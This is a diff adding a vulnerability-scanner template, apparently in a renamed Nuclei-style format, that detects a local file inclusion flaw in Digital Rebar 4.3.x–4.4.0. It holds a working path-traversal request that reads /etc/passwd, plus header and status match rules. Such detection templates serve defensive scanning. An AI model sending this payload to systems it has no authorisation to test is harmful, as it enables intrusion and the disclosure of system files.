@@ -1,0 +1,25 @@
+id: digitalrebar-traversal
+brief:
+    title: Digital Rebar - Local File Inclusion
+    by: c-sh0
+    level: high
+    about: Digital Rebar versions 4.3.0, 4.3.2, 4.3.3, 4.4.0, and maybe others are vulnerable to local file inclusion because web requests can navigate outside of DRP controlled areas.
+    label:
+        - lfi
+        - rackn
+        - digitalrebar
+        - vuln
+    score: CVSS:7.5
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
+      signs:
+        - "on": word
+          has:
+            - 'X-Drp-Sha256sum:'
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
